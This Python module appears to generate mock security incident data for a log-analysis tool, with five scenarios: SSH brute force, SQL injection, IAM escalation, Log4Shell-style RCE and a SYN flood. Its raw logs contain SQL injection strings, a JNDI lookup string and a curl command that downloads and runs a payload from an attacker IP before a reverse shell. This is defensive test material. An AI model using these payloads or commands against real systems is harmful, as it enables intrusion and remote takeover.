"""
mock_logs.py — SentinelAI Realistic Incident Dataset Generator

Provides 5 curated, realistic security incident log scenarios used for
demonstration, testing, and UI pre-population. Each scenario includes raw
multi-line log data, structured metadata, and severity classifications.
"""

from __future__ import annotations

from datetime import datetime, timedelta, timezone
from typing import Any
import random

# ---------------------------------------------------------------------------
# Scenario identifiers
# ---------------------------------------------------------------------------
SCENARIO_SSH_BRUTE_FORCE = "SSH_BRUTE_FORCE"
SCENARIO_SQL_INJECTION = "SQL_INJECTION"
SCENARIO_IAM_ESCALATION = "IAM_PRIVILEGE_ESCALATION"
SCENARIO_RCE = "REMOTE_CODE_EXECUTION"
SCENARIO_DDOS = "DDOS_SYN_FLOOD"

ALL_SCENARIOS = [
    SCENARIO_SSH_BRUTE_FORCE,
    SCENARIO_SQL_INJECTION,
    SCENARIO_IAM_ESCALATION,
    SCENARIO_RCE,
    SCENARIO_DDOS,
]

# ---------------------------------------------------------------------------
# Timestamp helpers
# ---------------------------------------------------------------------------

def _ts(offset_minutes: int = 0) -> str:
    """Return an ISO-8601 UTC timestamp offset by the given minutes."""
    base = datetime(2026, 10, 23, 7, 0, 0, tzinfo=timezone.utc)
    return (base + timedelta(minutes=offset_minutes)).strftime("%Y-%m-%dT%H:%M:%SZ")


# ---------------------------------------------------------------------------
# Scenario 1 — SSH Brute Force
# ---------------------------------------------------------------------------

SSH_BRUTE_FORCE: dict[str, Any] = {
    "id": "INC-2026-001",
    "scenario": SCENARIO_SSH_BRUTE_FORCE,
    "timestamp": _ts(0),
    "source_ip": "185.220.101.47",
    "destination_ip": "10.0.1.22",
    "event_type": "Authentication Failure (Repeated)",
    "severity": "HIGH",
    "affected_assets": ["web-prod-01 (10.0.1.22)", "sshd daemon"],
    "metadata": {
        "failed_attempts": 847,
        "time_window_minutes": 12,
        "usernames_tried": ["root", "admin", "ubuntu", "ec2-user", "deploy"],
        "geo_location": "Netherlands (Tor Exit Node)",
        "port": 22,
        "protocol": "TCP/SSH",
    },
    "raw_log": """\
Oct 23 07:00:01 web-prod-01 sshd[3821]: Failed password for root from 185.220.101.47 port 54231 ssh2
Oct 23 07:00:02 web-prod-01 sshd[3821]: Failed password for root from 185.220.101.47 port 54232 ssh2
Oct 23 07:00:02 web-prod-01 sshd[3822]: Failed password for admin from 185.220.101.47 port 54233 ssh2
Oct 23 07:00:03 web-prod-01 sshd[3823]: Failed password for ubuntu from 185.220.101.47 port 54234 ssh2
Oct 23 07:00:04 web-prod-01 sshd[3824]: Failed password for ec2-user from 185.220.101.47 port 54235 ssh2
Oct 23 07:00:05 web-prod-01 sshd[3825]: Invalid user deploy from 185.220.101.47 port 54236
Oct 23 07:00:05 web-prod-01 sshd[3825]: Failed password for invalid user deploy from 185.220.101.47 port 54236 ssh2
Oct 23 07:00:06 web-prod-01 sshd[3826]: Failed password for root from 185.220.101.47 port 54237 ssh2
Oct 23 07:00:07 web-prod-01 sshd[3827]: PAM 3 more authentication failures; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.47 user=root
Oct 23 07:00:08 web-prod-01 sshd[3828]: error: maximum authentication attempts exceeded for root from 185.220.101.47 port 54238 ssh2 [preauth]
Oct 23 07:11:42 web-prod-01 sshd[3901]: Accepted password for backup from 185.220.101.47 port 55001 ssh2
Oct 23 07:11:43 web-prod-01 sshd[3901]: pam_unix(sshd:session): session opened for user backup by (uid=0)
Oct 23 07:11:44 web-prod-01 sudo[3902]: backup : TTY=pts/1 ; PWD=/home/backup ; USER=root ; COMMAND=/bin/bash
""",
}

# ---------------------------------------------------------------------------
# Scenario 2 — SQL Injection
# ---------------------------------------------------------------------------

SQL_INJECTION: dict[str, Any] = {
    "id": "INC-2026-002",
    "scenario": SCENARIO_SQL_INJECTION,
    "timestamp": _ts(30),
    "source_ip": "203.0.113.88",
    "destination_ip": "10.0.2.15",
    "event_type": "Web Application SQL Injection Attempt",
    "severity": "CRITICAL",
    "affected_assets": ["api-gateway-prod (10.0.2.15)", "PostgreSQL users_db"],
    "metadata": {
        "endpoint": "/api/v1/users/search",
        "method": "GET",
        "user_agent": "sqlmap/1.7.8#stable (https://sqlmap.org)",
        "waf_triggered": True,
        "payloads_detected": 3,
        "db_errors_returned": True,
    },
    "raw_log": """\
[2026-10-23 07:30:11] [WARN] WAF: SQLi pattern detected | src=203.0.113.88 | uri=/api/v1/users/search?q=1%27+OR+%271%27%3D%271
[2026-10-23 07:30:11] [ERROR] PostgreSQL: ERROR: unterminated quoted string at or near "'" LINE 1: SELECT * FROM users WHERE username = '1' OR '1'='1'
[2026-10-23 07:30:12] [WARN] WAF: SQLi pattern detected | src=203.0.113.88 | uri=/api/v1/users/search?q=1%3BUNION+SELECT+null%2Cnull%2Cnull--
[2026-10-23 07:30:12] [ERROR] App: Unhandled exception in query builder | query=SELECT * FROM users WHERE id=1;UNION SELECT null,null,null--
[2026-10-23 07:30:13] [WARN] WAF: SQLi pattern detected | src=203.0.113.88 | uri=/api/v1/users/search?q=%27+AND+1%3D1+--
[2026-10-23 07:30:14] [WARN] WAF: Time-based blind SQLi detected | src=203.0.113.88 | uri=/api/v1/users/search?q=1%3BSELECT+pg_sleep(5)--
[2026-10-23 07:30:19] [ERROR] App: Request timeout after 5031ms | src=203.0.113.88 | uri=/api/v1/users/search
[2026-10-23 07:30:20] [CRITICAL] DB: Schema dump attempt detected: information_schema.tables referenced in query
[2026-10-23 07:30:21] [INFO] nginx: 203.0.113.88 - - [23/Oct/2026:07:30:21 +0000] "GET /api/v1/users/search?q=%27+OR+%271%27%3D%271 HTTP/1.1" 500 312 "-" "sqlmap/1.7.8"
""",
}

# ---------------------------------------------------------------------------
# Scenario 3 — IAM Privilege Escalation
# ---------------------------------------------------------------------------

IAM_ESCALATION: dict[str, Any] = {
    "id": "INC-2026-003",
    "scenario": SCENARIO_IAM_ESCALATION,
    "timestamp": _ts(60),
    "source_ip": "54.210.44.17",
    "destination_ip": "AWS IAM / CloudTrail",
    "event_type": "Unauthorized IAM Role Policy Escalation",
    "severity": "CRITICAL",
    "affected_assets": [
        "AWS Account: 123456789012",
        "IAM User: ci-deploy-svc",
        "Role: prod-admin-role",
    ],
    "metadata": {
        "cloud_provider": "AWS",
        "region": "us-east-1",
        "api_calls": [
            "iam:AttachRolePolicy",
            "iam:CreateAccessKey",
            "sts:AssumeRole",
        ],
        "managed_policy_attached": "arn:aws:iam::aws:policy/AdministratorAccess",
        "anomaly_score": 0.97,
        "mfa_used": False,
    },
    "raw_log": """\
{"eventVersion":"1.08","userIdentity":{"type":"IAMUser","principalId":"AIDA3EXAMPLE","arn":"arn:aws:iam::123456789012:user/ci-deploy-svc","accountId":"123456789012"},"eventTime":"2026-10-23T08:00:14Z","eventSource":"iam.amazonaws.com","eventName":"AttachRolePolicy","awsRegion":"us-east-1","sourceIPAddress":"54.210.44.17","userAgent":"aws-cli/2.15.0","requestParameters":{"roleName":"prod-admin-role","policyArn":"arn:aws:iam::aws:policy/AdministratorAccess"},"responseElements":null,"requestID":"a1b2c3d4-e5f6-7890-abcd-ef1234567890","eventID":"bb1234cc-dead-beef-cafe-112233445566","readOnly":false,"eventType":"AwsApiCall","managementEvent":true,"recipientAccountId":"123456789012"}
{"eventVersion":"1.08","userIdentity":{"type":"IAMUser","principalId":"AIDA3EXAMPLE","arn":"arn:aws:iam::123456789012:user/ci-deploy-svc","accountId":"123456789012"},"eventTime":"2026-10-23T08:00:31Z","eventSource":"iam.amazonaws.com","eventName":"CreateAccessKey","awsRegion":"us-east-1","sourceIPAddress":"54.210.44.17","requestParameters":{"userName":"prod-admin-role"},"responseElements":{"accessKey":{"accessKeyId":"AKIAIOSFODNN7EXAMPLE","status":"Active","userName":"prod-admin-role","createDate":"Oct 23, 2026 8:00:31 AM"}},"eventType":"AwsApiCall","managementEvent":true}
{"eventVersion":"1.08","userIdentity":{"type":"IAMUser","principalId":"AIDA3EXAMPLE","arn":"arn:aws:iam::123456789012:user/ci-deploy-svc"},"eventTime":"2026-10-23T08:01:05Z","eventSource":"sts.amazonaws.com","eventName":"AssumeRole","requestParameters":{"roleArn":"arn:aws:iam::123456789012:role/prod-admin-role","roleSessionName":"escalated-session"},"sourceIPAddress":"54.210.44.17","eventType":"AwsApiCall"}
""",
}

# ---------------------------------------------------------------------------
# Scenario 4 — Remote Code Execution
# ---------------------------------------------------------------------------

RCE: dict[str, Any] = {
    "id": "INC-2026-004",
    "scenario": SCENARIO_RCE,
    "timestamp": _ts(90),
    "source_ip": "92.118.160.5",
    "destination_ip": "10.0.3.44",
    "event_type": "Remote Code Execution via Deserialization",
    "severity": "CRITICAL",
    "affected_assets": [
        "app-server-03 (10.0.3.44)",
        "Java Spring Boot App (port 8080)",
        "/tmp filesystem",
    ],
    "metadata": {
        "vulnerability": "Log4Shell (CVE-2021-44228) variant / Java deserialization",
        "payload_vector": "HTTP User-Agent header",
        "process_spawned": "/bin/bash",
        "outbound_connection": "92.118.160.5:4444 (reverse shell)",
        "files_written": ["/tmp/.x", "/tmp/payload.sh"],
    },
    "raw_log": """\
[2026-10-23 08:30:07] [INFO] app-server-03 spring-app: Incoming request from 92.118.160.5 | User-Agent: ${jndi:ldap://92.118.160.5:1389/Exploit}
[2026-10-23 08:30:07] [ERROR] app-server-03 log4j: JNDI lookup triggered for ldap://92.118.160.5:1389/Exploit
[2026-10-23 08:30:08] [WARN]  app-server-03 jvm: Unexpected class loading from remote URL: http://92.118.160.5/ExploitClass.class
[2026-10-23 08:30:08] [ERROR] app-server-03 jvm: java.io.IOException: Serialization gadget chain executed
[2026-10-23 08:30:09] auditd: type=EXECVE msg=audit(1761194209.123:4501): argc=3 a0="/bin/bash" a1="-c" a2="curl http://92.118.160.5/payload.sh -o /tmp/payload.sh && chmod +x /tmp/payload.sh && /tmp/payload.sh"
[2026-10-23 08:30:09] auditd: type=SYSCALL msg=audit(1761194209.456:4502): arch=x86_64 syscall=execve success=yes pid=9901 ppid=9900 comm="bash" exe="/bin/bash"
[2026-10-23 08:30:10] auditd: type=CONNECT msg=audit(1761194210.001:4503): fd=3 saddr=020015B45C76A005 (92.118.160.5:4444)
[2026-10-23 08:30:10] [CRITICAL] EDR: Reverse shell detected | src_proc=/bin/bash pid=9901 | remote=92.118.160.5:4444
[2026-10-23 08:30:11] [CRITICAL] EDR: File written to /tmp/.x by pid=9901 (bash)
[2026-10-23 08:30:11] [CRITICAL] EDR: Privilege escalation attempt | pid=9901 attempting setuid(0)
""",
}

# ---------------------------------------------------------------------------
# Scenario 5 — DDoS SYN Flood
# ---------------------------------------------------------------------------

DDOS: dict[str, Any] = {
    "id": "INC-2026-005",
    "scenario": SCENARIO_DDOS,
    "timestamp": _ts(120),
    "source_ip": "DISTRIBUTED (see metadata)",
    "destination_ip": "203.0.113.200",
    "event_type": "Volumetric DDoS — SYN Flood",
    "severity": "HIGH",
    "affected_assets": [
        "load-balancer-01 (203.0.113.200)",
        "nginx ingress",
        "All downstream services",
    ],
    "metadata": {
        "peak_pps": 2_450_000,
        "peak_gbps": 18.4,
        "source_ips_count": 12_847,
        "target_port": 443,
        "botnet_family": "Mirai variant (suspected)",
        "syn_ack_ratio": "1:0.004",
        "duration_minutes": 23,
    },
    "raw_log": """\
[2026-10-23 09:00:01] kernel: nf_conntrack: table full, dropping packet
[2026-10-23 09:00:01] kernel: TCP: request_sock_TCP: Possible SYN flooding on port 443. Sending cookies. Check SNMP counters.
[2026-10-23 09:00:02] nginx: 2026/10/23 09:00:02 [warn] 1234#1234: *58291 upstream timed out (110: Connection timed out)
[2026-10-23 09:00:03] netflow: SRC=45.152.66.112   DST=203.0.113.200 PROTO=TCP DPT=443 SYN SEQ=0 WINDOW=65535
[2026-10-23 09:00:03] netflow: SRC=31.220.18.45    DST=203.0.113.200 PROTO=TCP DPT=443 SYN SEQ=0 WINDOW=65535
[2026-10-23 09:00:03] netflow: SRC=194.165.16.40   DST=203.0.113.200 PROTO=TCP DPT=443 SYN SEQ=0 WINDOW=65535
[2026-10-23 09:00:03] netflow: SRC=103.251.167.10  DST=203.0.113.200 PROTO=TCP DPT=443 SYN SEQ=0 WINDOW=65535
[2026-10-23 09:00:04] [ALERT] DDoS-Protect: Threshold exceeded | inbound_pps=2450000 | threshold=100000 | action=rate-limit-engaged
[2026-10-23 09:00:05] [ALERT] DDoS-Protect: BGP blackhole route advertised for 203.0.113.200/32
[2026-10-23 09:00:06] haproxy: Proxy listeners stopped and no more available in this process.
[2026-10-23 09:00:07] [CRITICAL] Uptime-Monitor: OUTAGE DETECTED | host=203.0.113.200 | http_status=0 | latency=timeout
[2026-10-23 09:23:14] [INFO] DDoS-Protect: Attack subsided | current_pps=8420 | BGP blackhole withdrawn
""",
}

# ---------------------------------------------------------------------------
# Public interface
# ---------------------------------------------------------------------------

_SCENARIO_MAP: dict[str, dict[str, Any]] = {
    SCENARIO_SSH_BRUTE_FORCE: SSH_BRUTE_FORCE,
    SCENARIO_SQL_INJECTION: SQL_INJECTION,
    SCENARIO_IAM_ESCALATION: IAM_ESCALATION,
    SCENARIO_RCE: RCE,
    SCENARIO_DDOS: DDOS,
}

_SEVERITY_ORDER = {"LOW": 0, "MEDIUM": 1, "HIGH": 2, "CRITICAL": 3}

_SCENARIO_LABELS: dict[str, str] = {
    SCENARIO_SSH_BRUTE_FORCE: "🔐 SSH Brute Force",
    SCENARIO_SQL_INJECTION: "💉 SQL Injection",
    SCENARIO_IAM_ESCALATION: "☁️  IAM Privilege Escalation",
    SCENARIO_RCE: "💀 Remote Code Execution",
    SCENARIO_DDOS: "🌊 DDoS SYN Flood",
}


def get_scenario(name: str) -> dict[str, Any]:
    """Return a copy of the named incident scenario dict.

    Args:
        name: One of the SCENARIO_* constants defined in this module.

    Returns:
        A dict containing 'id', 'scenario', 'timestamp', 'source_ip',
        'destination_ip', 'event_type', 'severity', 'affected_assets',
        'metadata', and 'raw_log'.

    Raises:
        KeyError: If the scenario name is not found.
    """
    if name not in _SCENARIO_MAP:
        raise KeyError(
            f"Unknown scenario '{name}'. "
            f"Valid options: {list(_SCENARIO_MAP.keys())}"
        )
    return dict(_SCENARIO_MAP[name])


def get_all_scenarios() -> list[dict[str, Any]]:
    """Return all scenarios as a list of dicts, sorted by severity (desc)."""
    return sorted(
        [dict(s) for s in _SCENARIO_MAP.values()],
        key=lambda s: _SEVERITY_ORDER.get(s["severity"], 0),
        reverse=True,
    )


def get_scenario_label(name: str) -> str:
    """Return a human-readable emoji-prefixed label for a scenario name."""
    return _SCENARIO_LABELS.get(name, name)


def get_scenario_names() -> list[str]:
    """Return the list of all available scenario identifiers."""
    return list(_SCENARIO_MAP.keys())
